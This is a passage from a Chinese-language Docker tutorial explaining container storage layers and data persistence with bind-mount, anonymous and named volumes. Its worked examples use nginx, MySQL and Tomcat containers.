如果将正在运行中的容器修改生成了新的数据，那么新产生的数据将会被复制到读写层，进行持久化保存，这个读写层也就是容器的工作目录，也为写时复制(COW) 机制。

COW机制节约空间,但会导致性低下,虽然关闭重启容器,数据不受影响,但会随着容器的删除,其对应的可写层也会随之而删除,即数据也会丢失.如果容器需要持久保存数据,并不影响性能可以用数据卷技术实现如下图是将对根的数据写入到了容器的可写层，但是把/data 中的数据写入到了一个另外的volume中用于数据持久化。
```

![1659931680978](linux体系.assets/1659931680978.png)

##### 48.7.1.1 Docker容器的分层

**容器的数据分层目录**

```
LowerDir: image 镜像层,即镜像本身，只读。
UpperDir: 容器的上层,可读写 ,容器变化的数据存放在此处。
MergedDir: 容器的文件系统，使用Union FS（联合文件系统）将lowerdir 和 upperdir 合并完成后给容器使用,最终呈现给用户的统一视图。
WorkDir: 容器在宿主机的工作目录,挂载后内容会被清空，且在使用过程中其内容用户不可见。
```

**范例: 查看指定容器数据分层**

```
#查看分层结构
[root@centos7 ~]# docker inspect 8a65f950ebb1
"GraphDriver": {
            "Data": {
                "LowerDir": "/var/lib/docker/overlay2/a53e4aa3ce30b4c06159f4bf189cda8a16eb3e0dd53d0c937d77f2bcc6342609-init/diff:/var/lib/docker/overlay2/e99265f85aa108867cb3d67ba47227dbbdcff730b9d27c82956b797e64217d66/diff",
                "MergedDir": "/var/lib/docker/overlay2/a53e4aa3ce30b4c06159f4bf189cda8a16eb3e0dd53d0c937d77f2bcc6342609/merged",
                "UpperDir": "/var/lib/docker/overlay2/a53e4aa3ce30b4c06159f4bf189cda8a16eb3e0dd53d0c937d77f2bcc6342609/diff",
                "WorkDir": "/var/lib/docker/overlay2/a53e4aa3ce30b4c06159f4bf189cda8a16eb3e0dd53d0c937d77f2bcc6342609/work"
            },
            "Name": "overlay2"
            
            
            
            
#每个镜像层目录中包含了一个文件link，文件内容则是当前层对应的短标识符，镜像层的内容则存放在diff目录
[root@centos7 ~]# find    /var/lib/docker/overlay2/848d77064091ba3ddd25a10ea6e0065af15ee701fed06f82804cf9ed58751761 -name test.img -ls
   920903  10240 -rw-r--r--   1 root     root     10485760 Jan 31 19:02 
/var/lib/docker/overlay2/848d77064091ba3ddd25a10ea6e0065af15ee701fed06f82804cf9ed58751761/merged/root/test.img
   920903  10240 -rw-r--r--   1 root     root     10485760 Jan 31 19:02 
/var/lib/docker/overlay2/848d77064091ba3ddd25a10ea6e0065af15ee701fed06f82804cf9ed58751761/diff/root/test.img




#删除容器后，所有容器数据目录都随之而删除
[root@ubuntu1804 ~]#docker rm -f 12959f2c152f 
[root@ubuntu1804 ~]#ls 
/var/lib/docker/overlay2/848d77064091ba3ddd25a10ea6e0065af15ee701fed06f82804cf9ed58751761
ls: cannot access '/var/lib/docker/overlay2/848d77064091ba3ddd25a10ea6e0065af15ee701fed06f82804cf9ed58751761': No such file or directory
```

##### 48.7.1.2 哪些数据需要持久化

**有状态的协议**

```
有状态协议就是就通信双方要记住双方，并且共享一些信息。而无状态协议的通信每次都是独立的，与上一次的通信没什么关系。
"状态”可以理解为“记忆”，有状态对应有记忆，无状态对应无记忆。


左侧是无状态的http请求服务，右侧为有状态。
下层为不需要存储的服务，上层为需要存储的部分服务。
```

![1659948812525](linux体系.assets/1659948812525.png)

##### 48.7.1.3 容器数据持久保存方式

```
如果要将写入到容器的数据永久保存，则需要将容器中的数据保存到宿主机的指定目录
Docker的数据类型分为两种: 
1）数据卷(Data Volume): 直接将宿主机目录挂载至容器的指定的目录 ，推荐使用此种方式，此方式较常用。
2）数据卷容器(Data Volume Container): 间接使用宿主机空间，数据卷容器是将宿主机的目录挂载至一个专门的数据卷容器，然后让其他容器通过数据卷容器读写宿主机的数据 ，此方式不常用。
```

![1659949427814](linux体系.assets/1659949427814.png)

#### 48.7.2 数据卷(data volume)

##### 48.7.2.1 数据卷特点和使用

```
数据卷实际上就是宿主机上的目录或者是文件，可以被直接mount到容器当中使用。
实际生成环境中，需要针对不同类型的服务、不同类型的数据存储要求做相应的规划，最终保证服务的可扩展性、稳定性以及数据的安全性。
```

**数据卷使用场景**

```
数据库
日志输出
静态web页面
应用配置文件
多容器间目录或文件共享
```

**数据卷的特点**

```
1）数据卷是目录或者文件，并且可以在多个容器之间共同使用,实现容器之间共享和重用。
2）对数据卷更改数据在所有容器里面会立即更新。
3）数据卷的数据可以持久保存，即使删除使用使用该容器卷的容器也不影响。
4）在容器里面的写入数据不会影响到镜像本身,即数据卷的变化不会影响镜像的更新。
5）依赖于宿主机目录，宿主机出问题，上面容器会受影响，当宿主机较多时，不方便统一管理。
6）匿名和命名数据卷在容器启动时初始化，如果容器使用的镜像在挂载点包含了数据，会拷贝到新初始化的数据卷中。
```

**数据卷使用方法**

```
启动容器时，可以指定使用数据卷实现容器数据的持久化,数据卷有三种
1）指定宿主机目录或文件: 指定宿主机的具体路径和容器路径的挂载关系。
2）匿名卷: 不指定数据名称,只指定容器内目录路径充当挂载点,docker自动指定宿主机的路径进行挂载。
3）命名卷: 指定数据卷的名称和容器路径的挂载关系。
```

**docker run 命令的以下格式可以实现数据卷**

```
-v, --volume=[host-src:]container-dest[:<options>]

<options>
ro 从容器内对此数据卷是只读，不写此项默认为可读可写
rw 从容器内对此数据卷可读可写,此为默认值
```

**方式1** 

```
#指定宿主机目录或文件格式: 
-v   <宿主机绝对路径的目录或文件>:<容器目录或文件>[:ro]  #将宿主机目录挂载容器目录，两个目录都可自动创建。
```

**方式2**

```
#匿名卷,只指定容器内路径,没有指定宿主机路径信息,宿主机自动生成/var/lib/docker/volumes/<卷ID>/_data目录,并挂载至容器指定路径。
-v <容器内路径> 


#示例:
docker run --name nginx -v /etc/nginx nginx
```

**方式3**

```
#命名卷将固定的存放在/var/lib/docker/volumes/<卷名>/_data
-v <卷名>:<容器目录路径> #可以通过以下命令事先创建,如可没有事先创建卷名,docker run时也会自动创建卷
docker volume create <卷名>
命名卷本质就是一个文件夹！！！！！


#示例:
docker run -d  -p 80:80 --name nginx01 -v vol1:/usr/share/nginx/html nginx
```

**docker rm 的 -v 选项可以删除容器时，同时删除相关联的匿名卷**

```
-v, --volumes   Remove the volumes associated with the container
```

**管理卷命令**

```
docker volume COMMAND

Commands:
 create     Create a volume
 inspect     Display detailed information on one or more volumes
  ls         List volumes
 prune       Remove all unused local volumes
  rm         Remove one or more volumes
```

**关于匿名数据卷和命名数据卷**

```
命名卷就是有名字的卷，使用 docker volume create <卷名> 形式创建并命名的卷；而匿名卷就是没名字的卷，一般是 docker run -v /data 这种不指定卷名的时候所产生，或者 Dockerfile 里面的定义直接使用的。

有名字的卷，在用过一次后，以后挂载容器的时候还可以使用，因为有名字可以指定。所以一般需要保存的数据使用命名卷保存。
而匿名卷则是随着容器建立而建立，随着容器消亡而淹没于卷列表中（对于 docker run 匿名卷不会被自动删除）。 因此匿名卷只存放无关紧要的临时数据，随着容器消亡，这些数据将失去存在的意义。

Dockerfile中指定VOLUME为匿名数据卷,其目的只是为了将某个路径确定为卷。

按照最佳实践的要求，不应该在容器存储层内进行数据写入操作，所有写入应该使用卷。如果定制镜像的时候，就可以确定某些目录会发生频繁大量的读写操作，那么为了避免在运行时由于用户疏忽而忘记指定卷，导致容器发生存储层写入的问题，就可以在 Dockerfile 中使用 VOLUME 来指定某些目录为匿名卷。这样即使用户忘记了指定卷，也不会产生不良的后果。
这个设置可以在运行时覆盖。通过 docker run 的 -v 参数或者 docker-compose.yml的 volumes 指定。使用命名卷的好处是可以复用，其它容器可以通过这个命名数据卷的名字来指定挂载，共享其内容（不过要注意并发访问的竞争问题）。

比如，Dockerfile 中说 VOLUME /data，那么如果直接 docker run，其 /data 就会被挂载为匿名卷，向 /data 写入的操作不会写入到容器存储层，而是写入到了匿名卷中。但是如果运行时 docker run -v mydata:/data，这就覆盖了 /data 的挂载设置，要求将 /data 挂载到名为 mydata 的命名卷中。所以说 Dockerfile 中的 VOLUME 实际上是一层保险，确保镜像运行可以更好的遵循最佳实践，不向容器存储层内进行写入操作。

数据卷默认可能会保存于 /var/lib/docker/volumes，不过一般不需要、也不应该访问这个位置。
```

**查看数据卷的挂载关系**

```
docker inspect --format="{{.Mounts}}" <容器ID>
```

**范例: 删除所有数据卷**

```
[root@ubuntu1804 ~]#docker volume rm `docker volume ls -q`
```

##### 48.7.2.2 实战案例

###### 48.7.2.2.1 目录数据卷

**在宿主机创建容器所使用的目录**

```
[root@ubuntu1804 ~]#mkdir /data/testdir
[root@ubuntu1804 ~]#echo Test page on host > /data/testdir/index.html
```

**查看容器相关目录路径**

```
[root@ubuntu1804 ~]#docker images "*nginx*"
REPOSITORY         TAG                 IMAGE ID           CREATED             
SIZE
nginx-ubuntu1804    1.16.1             19efdd23ac87        2 days ago         
378MB
nginx-alpine        1.16.1             978a43bbb61d        2 days ago         
211MB



#这是编译安装后的nginx
[root@ubuntu1804 ~]#docker run -it --rm nginx-alpine:1.16.1 sh
/ # cat /apps/nginx/conf/nginx.conf
...
   server {
...
       location / {
           root   /data/nginx/html;  #nginx存放网页文件的路径
           index index.html index.htm;
       }
...
/ # cat /apps/nginx/html/index.html 
Test Page based nginx-alpine
/ # exit
[root@ubuntu1804 ~]#docker ps -a
CONTAINER ID       IMAGE               COMMAND             CREATED             
STATUS             PORTS               NAMES
```

**引用宿主机的数据卷启动容器**

```
引用数据卷目录，开启多个容器
[root@ubuntu1804 ~]#docker run -d -v /data/testdir:/apps/nginx/html/ -p 8001:80 nginx-alpine:1.16.1
56a5460f584bd2de56040c4a1dff86ad8a9723cfd6bf21ed8a538b9629b0874c

[root@ubuntu1804 ~]#docker run -d -v /data/testdir:/apps/nginx/html/ -p 8002:80 nginx-alpine:1.16.1
e7b5bff6ce56fa51ed6411175c9c9f1fb9bf8e7b1b9471080380b01692f89e58
[root@ubuntu1804 ~]#docker ps 
CONTAINER ID       IMAGE                 COMMAND             CREATED           
  STATUS             PORTS                           NAMES
e7b5bff6ce56       nginx-alpine:1.16.1   "nginx"             6 seconds ago     
  Up 5 seconds        443/tcp, 0.0.0.0:8002->80/tcp   hungry_robinson
56a5460f584b       nginx-alpine:1.16.1   "nginx"             33 seconds ago     
Up 31 seconds       443/tcp, 0.0.0.0:8001->80/tcp   stupefied_dubinsky
[root@ubuntu1804 ~]#curl 127.0.0.1:8001
Test page on host
[root@ubuntu1804 ~]#curl 127.0.0.1:8002
Test page on host
```

**进入到容器内测试写入数据**

```
#进入其中一个容器写入数据，可以其它容器的数据也变化
[root@ubuntu1804 ~]#docker exec -it e7b5bff6ce56 sh
/ # df
Filesystem           1K-blocks     Used Available Use% Mounted on
overlay               47799020   5294492  40046724  12% /
tmpfs                    65536         0     65536   0% /dev
tmpfs                   492552         0    492552   0% /sys/fs/cgroup
shm                      65536         0     65536   0% /dev/shm
/dev/sda2             47799020   5294492  40046724  12% /etc/resolv.conf
/dev/sda2             47799020   5294492  40046724  12% /etc/hostname
/dev/sda2             47799020   5294492  40046724  12% /etc/hosts
/dev/sda3             19091540   3958732  14139940  22% /data/nginx/html
tmpfs                   492552         0    492552   0% /proc/asound
tmpfs                   492552         0    492552   0% /proc/acpi
tmpfs                    65536         0     65536   0% /proc/kcore
tmpfs                    65536         0     65536   0% /proc/keys
tmpfs                    65536         0     65536   0% /proc/timer_list
tmpfs                    65536         0     65536   0% /proc/sched_debug
tmpfs                   492552         0    492552   0% /proc/scsi
tmpfs                   492552         0    492552   0% /sys/firmware
/ # cat /apps/nginx/html/index.html 
Test page on host
/ # echo Test page v2 on host > /apps/nginx/html/index.html

#进入另一个容器看到数据变化
[root@ubuntu1804 ~]#docker exec -it 56a5460f584b sh
/ # cat /apps/nginx/html/index.html 
Test page v2 on host


#访问应用
[root@ubuntu1804 ~]#curl 127.0.0.1:8001
Test page v2 on host
[root@ubuntu1804 ~]#curl 127.0.0.1:8002
Test page v2 on host
```

**在宿主机修改数据**

```
[root@ubuntu1804 ~]#echo Test page v3 on host > /data/testdir/index.html
[root@ubuntu1804 ~]#cat /data/testdir/index.html
Test page v3 on host
[root@ubuntu1804 ~]#curl 127.0.0.1:8001
Test page v3 on host
[root@ubuntu1804 ~]#curl 127.0.0.1:8002
Test page v3 on host


[root@ubuntu1804 ~]#docker exec -it e7b5bff6ce56 sh
/ # cat /apps/nginx/html/index.html 
Test page v3 on host
[root@ubuntu1804 ~]#docker exec -it 56a5460f584b sh
/ # cat /apps/nginx/html/index.html 
Test page v3 on host
```

**只读方法挂载数据卷**

```
#默认数据卷为可读可写，加ro选项，可以实现只读挂载，对于不希望容器修改的数据，比如: 配置文件，脚本等，可以用此方式挂载。

[root@ubuntu1804 ~]#docker run -d -v /data/testdir:/apps/nginx/html/:ro -p 8004:80 nginx-alpine:1.16.1
727d3ecf65c5a79bd9a11033812dc01619c4c45bd25af5155f904016f5f0c45a


[root@ubuntu1804 ~]#docker exec -it 727d3ecf65c5a79bd9 sh
/ # cat /data/nginx/html/index.html 
Test page v3 on host
/ # echo Test page v4 on host > /data/nginx/html/index.html
sh: can't create /data/nginx/html/index.html: Read-only file system
/ # cat /data/nginx/html/index.html
```

**删除容器**

```
#删除容器后，宿主机的数据卷还存在，可继续给新的容器使用
[root@ubuntu1804 ~]#docker ps -a
CONTAINER ID       IMAGE                 COMMAND             CREATED           
  STATUS             PORTS                           NAMES
e7b5bff6ce56       nginx-alpine:1.16.1   "nginx"             9 minutes ago     
  Up 9 minutes        443/tcp, 0.0.0.0:8002->80/tcp   hungry_robinson
56a5460f584b       nginx-alpine:1.16.1   "nginx"             9 minutes ago     
  Up 9 minutes        443/tcp, 0.0.0.0:8001->80/tcp   stupefied_dubinsky
[root@ubuntu1804 ~]#docker rm -f `docker ps -aq`
e7b5bff6ce56
56a5460f584b
[root@ubuntu1804 ~]#cat /data/testdir/index.html 
Test page v3 on host


#新建的容器还可以继续使用原有的数据卷
[root@ubuntu1804 ~]#docker run -d -v /data/testdir:/apps/nginx/html/ -p 8003:80 nginx-alpine:1.16.1
ecd016506f6af3f4af61dbd869f8fce5f634ecdc0e3272f9e0402c981acd80a4
[root@ubuntu1804 ~]#curl 127.0.0.1:8003
Test page v3 on host
```

###### 48.7.2.2.2 MySQL使用的数据卷

```
[root@ubuntu1804 ~]#docker pull mysql:5.7.30
5.7.29: Pulling from library/mysql
Status: Downloaded newer image for mysql:5.7.30
docker.io/library/mysql:5.7.29


[root@ubuntu1804 ~]#docker images "mysql*"
REPOSITORY         TAG                 IMAGE ID           CREATED             
SIZE
mysql               5.7.29             b598110d0fff        2 weeks ago         
435MB


[root@ubuntu1804 ~]#docker run -d -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql:5.7.30
[root@ubuntu1804 ~]#docker ps 
CONTAINER ID       IMAGE               COMMAND                 CREATED         
    STATUS             PORTS                               NAMES
c21ca6f8a7fe       mysql:5.7.30        "docker-entrypoint.s…"   3 minutes ago   
    Up 3 minutes        0.0.0.0:3306->3306/tcp, 33060/tcp   nifty_banach
    

[root@ubuntu1804 ~]#mysql -uroot -p123456 -h127.0.0.1
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor. Commands end with ; or \g.
Your MySQL connection id is 2
Server version: 5.7.30 MySQL Community Server (GPL)

Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respective owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+ 
4 rows in set (0.00 sec)

mysql> create database dockerdb;
Query OK, 1 row affected (0.00 sec)

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| dockerdb           |
| mysql              |
| performance_schema |
| sys                |
+--------------------+ 
5 rows in set (0.01 sec)



#删除容器后，再创建新的容器，数据库信息丢失
[root@ubuntu1804 ~]#docker rm -f c21ca6f8a7fe 
c21ca6f8a7fe

[root@ubuntu1804 ~]#docker run -d --name mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql:5.7.30
f52a50c7f80ee39d9a935a762eacb05db72dcfa5f0d02af8b4f23b5538080b67

[root@ubuntu1804 ~]#mysql -uroot -p123456 -h127.0.0.1
Welcome to the MySQL monitor. Commands end with ; or \g.
Your MySQL connection id is 2
Server version: 5.7.30 MySQL Community Server (GPL)

Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respective owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+ 
4 rows in set (0.00 sec)




#利用数据卷创建容器
#创建的宿主机文件夹必须为空，不为空mysql容器无法与宿主机指定文件夹进行关联！！
[root@ubuntu1804 ~]#mkdir /data/mysql
[root@ubuntu1804 ~]#docker run -d --name mysql -p 3306:3306 -v /data/mysql/:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 mysql:5.7.30
d64ef3f9a64491061132020306fd3e97e1aa361b0fb9f6f644f2a1e3f334119c


[root@ubuntu1804 ~]#mysql -uroot -p123456 -h127.0.0.1
mysql> create database dockerdb;
Query OK, 1 row affected (0.00 sec)

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| dockerdb           |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> exit




#删除容器，数据存放在挂载数据卷中，不会删除
[root@ubuntu1804 ~]#docker rm -fv mysql
mysql
[root@ubuntu1804 ~]#ls /data/mysql/
auto.cnf   ca.pem    client-key.pem ib_buffer_pool ib_logfile0 
ibtmp1 performance_schema public_key.pem   server-key.pem ca-key.pem client-cert.pem dockerdb   ibdata1         ib_logfile1 mysql private_key.pem     server-cert.pem sys



#重新创建新容器，之前数据还在
[root@ubuntu1804 ~]#docker run -d --name mysql -p 3306:3306 -v /data/mysql/:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 mysql:5.7.30
d64ef3f9a64491061132020306fd3e97e1aa361b0fb9f6f644f2a1e3f334119c



[root@ubuntu1804 ~]#mysql -uroot -p123456 -h127.0.0.1
mysql> create database dockerdb;
Query OK, 1 row affected (0.00 sec)

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| dockerdb           |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> exit




#指定多个数据卷，创建MySQL
[root@ubuntu1804 ~]#docker run --name mysql-test1 -v /data/mysql:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -e MYSQL_DATABASE=wordpress -e MYSQL_USER=wpuser -e MYSQL_PASSWORD=123456 -d -p 3306:3306 mysql:5.7.30


#配置文件进行持久化保存
[root@ubuntu1804 ~]#docker run --name mysql-test2 -v /root/mysql/:/etc/mysql/conf.d -v /data/mysql2:/var/lib/mysql --env-file=env.list -d -p 3307:3306 mysql:5.7.30


[root@ubuntu1804 ~]#cat mysql/mysql-test.cnf 
[mysqld]
server-id=100
log-bin=mysql-bin


[root@ubuntu1804 ~]#cat env.list 
MYSQL_ROOT_PASSWORD=123456
MYSQL_DATABASE=wordpress
MYSQL_USER=wpuser
MYSQL_PASSWORD=wppass
```

###### 48.7.2.2.3 文件数据卷

文件挂载用于很少更改文件内容的场景，比如: nginx 的配置文件、tomcat的配置文件等。

**准备相关文件**

```
[root@ubuntu1804 ~]#mkdir /data/{bin,testapp,logs}
[root@ubuntu1804 ~]#echo testapp v1 > /data/testapp/index.html
[root@ubuntu1804 ~]#cat /data/testapp/index.html
testapp v1
[root@ubuntu1804 ~]#cp /data/dockerfile/web/tomcat/tomcat-base-8.5.50/apachetomcat-8.5.50/bin/catalina.sh /data/bin/
[root@ubuntu1804 ~]#vim /data/bin/catalina.sh
#加下面tomcat的优化参数行
# -----------------------------------------------------------------------------
JAVA_OPTS="-server -Xms4g -Xmx4g -Xss512k -Xmn1g -XX:CMSInitiatingOccupancyFraction=65 -XX:+AggressiveOpts -XX:+UseBiasedLocking -XX:+DisableExplicitGC -XX:MaxTenuringThreshold=10 -XX:NewRatio=2 -XX:PermSize=128m -XX:MaxPermSize=512m -XX:CMSFullGCsBeforeCompaction=5 -XX:+ExplicitGCInvokesConcurrent -XX:+UseConcMarkSweepGC -XX:+UseParNewGC -XX:+CMSParallelRemarkEnabled -XX:+UseCMSCompactAtFullCollection -XX:LargePageSizeInBytes=128m -XX:+UseFastAccessorMethods"
# OS specific support. $var _must_ be set to either true or false


[root@ubuntu1804 ~]#chown 2019:2019 /data/bin/catalina.sh
[root@ubuntu1804 ~]#ll /data/bin/catalina.sh
-rwxr-x--- 1 2019 2019 24324 Jan 31 21:43 /data/bin/catalina.sh*
[root@ubuntu1804 ~]#chown 2019:2019 /data/logs/
```

**引用文件数据卷启动容器**

```
#同时挂载可读可写方式的目录数据卷和只读方式的文件数据卷，实现三个数据卷的挂载，数据，日志和启动脚本
[root@ubuntu1804 ~]#docker run -d -v /data/bin/catalina.sh:/apps/tomcat/bin/catalina.sh:ro -v 
/data/testapp:/data/tomcat/webapps/testapp -v /data/logs:/apps/tomcat/logs -p 8080:8080 tomcat-web:app1
55de76261c5e489de9a24d5533fe630d44aa7cce821627f6503a91c041c8f8d3
```

 **验证容器可以访问**

```
[root@ubuntu1804 ~]#curl 127.0.0.1:8080/testapp/
testapp v1


[root@ubuntu1804 ~]#ls -l /data/logs/
total 36
drwxr-xr-x 2 2019 2019 4096 Jan 31 22:44 ./
drwxr-xr-x 7 root root 4096 Jan 31 22:43 ../
-rw-r----- 1 2019 2019 8336 Jan 31 22:44 catalina.2020-01-31.log
-rw-r----- 1 2019 2019 8808 Jan 31 22:44 catalina.out
-rw-r----- 1 2019 2019    0 Jan 31 22:44 host-manager.2020-01-31.log
-rw-r----- 1 2019 2019    0 Jan 31 22:44 localhost.2020-01-31.log
-rw-r----- 1 2019 2019   76 Jan 31 22:44 localhost_access_log.2020-01-31.txt
-rw-r----- 1 2019 2019    0 Jan 31 22:44 manager.2020-01-31.log
```

**直接修改宿主机的数据**

```
#宿主机修改目录数据卷
[root@ubuntu1804 ~]#echo testapp v2 > /data/testapp/index.html
[root@ubuntu1804 ~]#curl 127.0.0.1:8080/testapp/
testapp v2


[root@ubuntu1804 ~]#ll /data/bin/catalina.sh 
-rwxr-x--- 1 2019 2019 24324 Jan 31 21:43 /data/bin/catalina.sh*
[root@ubuntu1804 ~]#echo >> /data/bin/catalina.sh
[root@ubuntu1804 ~]#ll /data/bin/catalina.sh 
-rwxr-x--- 1 2019 2019 24325 Jan 31 22:21 /data/bin/catalina.sh*
```

**进入容器修改数据进入容器修改数据**

```
root@ubuntu1804 ~]#docker exec -it 55de76261c5e bash
[root@55de76261c5e /]# netstat -ntl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:8005          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:8009            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN  


#文件数据卷上的文件为只读
[root@55de76261c5e /]# echo >> /apps/tomcat/bin/catalina.sh
bash: /apps/tomcat/bin/catalina.sh: Read-only file system


#目录数据卷可读可写
[root@55de76261c5e /]# cat /data/tomcat/webapps/testapp/index.html 
testapp v2
[root@55de76261c5e /]# echo testapp v3 > /data/tomcat/webapps/testapp/index.html 
[root@55de76261c5e /]# cat /data/tomcat/webapps/testapp/index.html 
testapp v3


[root@ubuntu1804 ~]#curl 127.0.0.1:8080/testapp/
testapp v3
```

**查看容器中挂载和进程信息**

```
[root@55de76261c5e /]# mount
......
/dev/sda3 on /apps/apache-tomcat-8.5.50/bin/catalina.sh type ext4 
(ro,relatime,data=ordered)
/dev/sda3 on /data/tomcat/webapps/testapp type ext4 (rw,relatime,data=ordered)
......
[root@55de76261c5e /]# df
Filesystem     1K-blocks   Used Available Use% Mounted on
overlay         47799020 5295032  40046184  12% /
tmpfs              65536       0     65536   0% /dev
tmpfs             492552       0    492552   0% /sys/fs/cgroup
shm                65536       0     65536   0% /dev/shm
/dev/sda2       47799020 5295032  40046184  12% /etc/hosts
/dev/sda3       19091540 3974908  14123764  22% /data/tomcat/webapps/testapp
tmpfs             492552       0    492552   0% /proc/asound
tmpfs             492552       0    492552   0% /proc/acpi
tmpfs             492552       0    492552   0% /proc/scsi
tmpfs             492552       0    492552   0% /sys/firmware



[root@55de76261c5e /]# ps aux
USER       PID %CPU %MEM   VSZ   RSS TTY     STAT START   TIME COMMAND
root          1  0.0  0.3  15136  3040 ?       Ss   22:09   0:00 /bin/bash 
/apps/tomcat/bin/run_tomcat.sh
www          25  0.5 12.7 6253760 125268 ?     Sl   22:09   0:04 
/usr/local/jdk/bin/java -Djava.util.logging.config.file=/apps/tomcat
root         26  0.0  0.4  85428  4468 ?       S    22:09   0:00 su - www -c
tail -f /etc/hosts
www          28  0.0  0.0   4416   716 ?       Ss   22:09   0:00 tail -f
/etc/hosts
root         85  0.0  0.4  15800  3980 pts/0   Ss   22:16   0:00 bash
root        109  0.0  0.3  55196  3696 pts/0   R+   22:25   0:00 ps aux
```

###### 48.7.2.2.4 匿名数据卷

```
[root@ubuntu1804 ~]#docker volume ls
DRIVER             VOLUME NAME


[root@ubuntu1804 ~]#docker ps -a
CONTAINER ID       IMAGE               COMMAND             CREATED             
STATUS             PORTS               NAMES


#利用匿名数据卷创建容器
[root@ubuntu1804 ~]#docker run -d -p 80:80 --name nginx01 -v /usr/share/nginx/html nginx
914c622af7ebae68aab0b0075da39534fdb118cd5d4d7adf3054da94eb2a4952


[root@ubuntu1804 ~]#curl 127.0.0.1
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
   body {
       width: 35em;
       margin: 0 auto;
       font-family: Tahoma, Verdana, Arial, sans-serif;
   }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>
<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>
<p><em>Thank you for using nginx.</em></p>
</body>
</html>




#查看自动生成的匿名数据卷
[root@ubuntu1804 ~]#docker volume ls
DRIVER             VOLUME NAME
local              2a18aff09215e7830c6df56a80e0f8ace9b44f3384d512daf06d75502f8b40fe 



#查看匿名数据卷的详细信息
[root@ubuntu1804 ~]#docker volume inspect  2a18aff09215e7830c6df56a80e0f8ace9b44f3384d512daf06d75502f8b40fe 
[
   {
        "CreatedAt": "2020-07-21T19:17:07+08:00",
        "Driver": "local",
        "Labels": null,
        "Mountpoint": 
"/var/lib/docker/volumes/2a18aff09215e7830c6df56a80e0f8ace9b44f3384d512daf06d75502f8b40fe/_data",
        "Name": 
"2a18aff09215e7830c6df56a80e0f8ace9b44f3384d512daf06d75502f8b40fe",
        "Options": null,
        "Scope": "local"
   }
]
[root@ubuntu1804 ~]#docker inspect --format="{{.Mounts}}" nginx01
[{volume 2a18aff09215e7830c6df56a80e0f8ace9b44f3384d512daf06d75502f8b40fe 
/var/lib/docker/volumes/2a18aff09215e7830c6df56a80e0f8ace9b44f3384d512daf06d7550
2f8b40fe/_data /usr/share/nginx/html local  true }]


#查看匿名数据卷的文件
[root@ubuntu1804 ~]#ls 
/var/lib/docker/volumes/2a18aff09215e7830c6df56a80e0f8ace9b44f3384d512daf06d75502f8b40fe/_data
50x.html index.html


#修改宿主机中匿名数据卷的文件
[root@ubuntu1804 ~]#echo Anonymous Volume >  /var/lib/docker/volumes/2a18aff09215e7830c6df56a80e0f8ace9b44f3384d512daf06d75502f8b40fe/_data/index.html


[root@ubuntu1804 ~]#curl 127.0.0.1
Anonymous Volume



#删除容器不会删除匿名数据卷
[root@ubuntu1804 ~]#docker rm -f nginx01
nginx01
[root@ubuntu1804 ~]#docker volume ls
DRIVER             VOLUME NAME
local               
2a18aff09215e7830c6df56a80e0f8ace9b44f3384d512daf06d75502f8b40fe



[root@ubuntu1804 ~]#docker run -d -p 80:80 --name nginx01 -v 
/usr/share/nginx/html nginx
40a99ae066cc60aa0ad7d073e46101a15446509acbd7971e677f3cbe6733aa79
[root@ubuntu1804 ~]#cat 
/var/lib/docker/volumes/2a18aff09215e7830c6df56a80e0f8ace9b44f3384d512daf06d75502f8b40fe/_data/index.html
Anonymous Volume



#删除容器并且删除匿名数据卷
[root@ubuntu1804 ~]#docker rm -fv nginx01
[root@ubuntu1804 ~]#docker volume ls
DRIVER             VOLUME NAME
```

###### 48.7.2.2.5 命名数据卷

**创建命名数据卷**

```
[root@ubuntu1804 ~]#docker volume create vol1
vol1
[root@ubuntu1804 ~]#docker volume ls
DRIVER             VOLUME NAME
local               vol1
[root@ubuntu1804 ~]#docker inspect vol1
[
   {
        "CreatedAt": "2020-07-21T18:36:45+08:00",
        "Driver": "local",
        "Labels": {},
        "Mountpoint": "/var/lib/docker/volumes/vol1/_data",
        "Name": "vol1",
        "Options": {},
        "Scope": "local"
   }
]
```

**使用命名数据卷创建容器**

```
[root@ubuntu1804 ~]#docker run -d -p 8001:80 --name nginx01 -v vol1:/usr/share/nginx/html nginx
2a2ad99de2984521cbce777eae8e482c3e6e55e35ab5f398a35c7986fa39cc99
[root@ubuntu1804 ~]#curl 127.0.0.1:8001
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
   body {
       width: 35em;
       margin: 0 auto;
              font-family: Tahoma, Verdana, Arial, sans-serif;
   }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
